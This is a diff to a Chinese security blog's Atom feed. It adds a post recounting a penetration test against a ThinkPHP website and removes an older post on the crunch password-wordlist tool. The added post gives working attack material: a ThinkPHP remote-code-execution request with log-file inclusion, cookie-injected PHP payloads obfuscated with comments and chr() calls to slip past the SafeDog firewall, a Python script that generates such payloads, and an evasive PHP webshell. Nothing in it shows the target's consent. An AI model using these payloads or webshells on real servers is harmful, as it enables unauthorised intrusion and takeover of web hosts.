@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://h3art3ars.github.io/"/>
-  <updated>2020-05-21T08:03:58.425Z</updated>
+  <updated>2020-05-22T13:47:52.911Z</updated>
   <id>http://h3art3ars.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>渗透测试纪实-tp过安全狗</title>
+    <link href="http://h3art3ars.github.io/2020/05/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-tp%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/"/>
+    <id>http://h3art3ars.github.io/2020/05/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-tp%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/</id>
+    <published>2020-05-22T13:45:12.000Z</published>
+    <updated>2020-05-22T13:47:52.911Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前"><a href="#前" class="headerlink" title="前"></a>前</h1><p>拿到目标站后，看了看url，为 <code>signup.html</code>，加了个 <code>?s=captcha</code>,显示验证码，判断为tp框架。</p><p>果断拿起exp测试</p><p><img src="/images/image-20200522191303596.png" alt="image-20200522191303596"></p><p>很好，能成功，暗自窃喜一波。</p><p>之后看看phpinfo；</p><p><img src="/images/image-20200522191416443.png" alt="image-20200522191416443"></p><p>被拦截了</p><p>之后测试了一下404页面。</p><p><img src="/images/image-20200522191504255.png" alt="image-20200522191504255"></p><p>熟悉的拦路狗。</p><h1 id="中"><a href="#中" class="headerlink" title="中"></a>中</h1><p>猜测拦截了exp，但是很明显没有拦截包含日志的exp。</p><ul><li><p>试试包含日志。</p><p>将cookie设为 <code>&lt;?php phpinfo();?&gt;</code></p><p>结果被拦截，猜测拦截函数。</p></li><li><p>将cookie设为 <code>&lt;?php phpinfo/**/();?&gt;</code>,绕过了。php7.2版本。</p><p><img src="/images/image-20200522193950383.png" alt="image-20200522193950383"></p></li><li><p>之后测试一下写入</p><p><code>Cookie:file_put_contents/**/(&#39;./readme.txt&#39;,&#39;h3art3ars&#39;);</code></p><p><img src="/images/image-20200522195121019.png" alt="image-20200522195121019"></p><p>过滤了单引号，就知道没那么容易。</p></li><li><p>试一下不带payload的一句话 <code>&lt;? eval/**/(base64_decode($_POST[1]));?&gt;</code></p><p><code>post:_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=../runtime/log/202005/22.log&amp;1=cGhwaW5mbygpOw==</code></p><p>结果依旧被拦截。</p></li><li><p>测试了一下，是拦截了 $_POST[] 参数，那就继续绕过。将 <code>_POST</code> 参数，利用引用参数代替。</p><p>在本地 php shell 里面测试</p><p><img src="/images/image-20200522201052725.png" alt="image-20200522201052725"></p><p>可以看到在本地linux是测试成功的。</p></li><li><p>直接放到cookie里面看看：<code>Cookie:&lt;? $a=chr/**/(95).chr/**/(80).chr/**/(79).chr/**/(83).chr/**/(84);eval/**/(base64_decode/**/($/**/{$a}[1]));?&gt;</code></p><p><img src="/images/image-20200522201322865.png" alt="image-20200522201322865"></p><p>对方系统windows，出错了。不知道是为什么。</p></li><li><p>那就只能换一个思路，直接将要执行的命令用chr函数表示。</p><p>由于一个一个chr太麻烦，索性写了个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import base64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cmd &#x3D; &#39;phpinfo()&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">strs &#x3D; base64.b64encode(cmd.encode(&#39;utf-8&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">strs &#x3D; bytes.decode(strs)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">for c in strs:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    a +&#x3D; &quot;chr&#x2F;**&#x2F;(&quot; + str(ord(c))+&#39;).&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">a &#x3D; a[0:-1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;&lt;? $a&#x3D;&#39;+a + &#39;;eval&#x2F;**&#x2F;(base64_decode&#x2F;**&#x2F;($a));?&gt;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">print(a)</span></pre></td></tr></table></figure><p><img src="/images/image-20200522203613777.png" alt="image-20200522203613777"></p></li><li><p>把payload复制到cookie中试试,成功。</p><p><img src="/images/image-20200522203503512.png" alt="image-20200522203503512"></p></li><li><p>接下来写入一句话，然而却是访问404.</p></li><li><p>猜测是狗吃了一句话，那就从上次写的 <code>php新特性过马</code>文章中拿一个试试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$b&#x3D;&quot;_POST&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[$&#123;$b&#125;[&#39;a&#39;]];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">[$c]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval($c);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/image-20200522210021466.png" alt="image-20200522210021466"></p><p>执行，测试一下。</p><p><img src="/images/image-20200522210102083.png" alt="image-20200522210102083"></p><p>成功。</p></li></ul><h1 id="尾"><a href="#尾" class="headerlink" title="尾"></a>尾</h1><p>windows提权，未成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Windows NT WIN-RU4FAFHHEMH 6.1 build 7601 (Windows Server 2008 R2 Enterprise Edition Service Pack 1) AMD64</span></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      渗透测试记录
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://h3art3ars.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="http://h3art3ars.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>渗透测试纪实-1</title>
@@ -526,33 +549,6 @@
       <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
     
       <category term="hash密码破解" scheme="http://h3art3ars.github.io/tags/hash%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>crunch</title>
-    <link href="http://h3art3ars.github.io/2019/12/11/crunch/"/>
-    <id>http://h3art3ars.github.io/2019/12/11/crunch/</id>
-    <published>2019-12-11T06:36:27.000Z</published>
-    <updated>2019-12-11T06:39:27.175Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h1><ul><li><h2 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">crunch 4 4 -t %^@,    &#x2F;&#x2F;生成4位数字，特殊字符，小写大写字母</span></pre></td></tr></table></figure></li><li><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">min    设定最小字符串长度（必选）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  max    设定最大字符串长度（必选）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  &#x2F;&#x2F;默认位小写字符集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  oprions</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  -b     指定文件输出的大小，避免字典文件过大  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  -c     指定文件输出的行数，即包含密码的个数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  -d     限制相同元素出现的次数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  -e     定义停止字符，即到该字符串就停止生成</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  -f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  -i     改变输出格式，即aaa,aab -&gt; aaa,baa</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  -I     通常与-t联合使用，表明该字符为实义字符</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  -m     通常与-p搭配</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  -o     将密码保存到指定文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  -p     指定元素以组合的方式进行</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  -q     读取密码文件，即读取pass.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  -r     定义重某一字符串重新开始</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  -s     指定一个开始的字符，即从自己定义的密码xxxx开始</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  -t     指定密码输出的格式</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  -u     禁止打印百分比（必须为最后一个选项）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z</span></pre></td></tr></table></figure><ul><li><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol><li><p>生成自己制定字符集的字典(字符集中有空格需要双引号或者空格转义)</p><p><code>crunch 2 4 &quot;abc &quot;</code></p></li><li><p>生成数个元素组合（社工字典 max min参数无效）</p><p><code>crunch 4 4 -p zhangsan 2018 0101</code></p></li><li><p>生成某字符串的所有组合</p><p><code>crunch 4 4 -p abc</code></p></li><li><p>生成指定格式字符串</p><p><code>crunch 4 4 -t %^@, -o ./dict.txt</code></p></li><li><p>设置字符集</p><p><code>crunch 6 6 -f /usr/share/crunch/charset.lst 字符集 -t %%dog@ //@表示当前字符集</code></p></li><li><p>指定某类字符的集合</p><p>生成3位密码，第一位由是123，第三位bcd,<strong>+为占位符</strong></p><p><code>crunch 3 3 bcd + 123 + -t %@^ -f charset.lst  mixalpha-numeric-all-space</code></p></li><li><p>生成5个元素组成的密码，前三个为固定字符，后两个为小写大写字符,<strong>d为占位符</strong></p><p><code>crunch 5 5 -t ddd@, -p dog cat bird</code></p></li><li><p>去除-t参数中的特殊字符含义,<strong>a为占位符</strong></p><p><code>crunch 5 5 -t p@as% -I a@aaa</code></p></li></ol></li><li><p>详情</p><p><a href="https://blog.csdn.net/fox_wayen/article/details/78429140" target="_blank" rel="noopener">详解</a></p></li></ul></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      crunch 生成字典
-    
-    </summary>
-    
-    
-      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
-    
-    
-      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
-    
-      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
-    
-      <category term="kali" scheme="http://h3art3ars.github.io/tags/kali/"/>
     
   </entry>
   
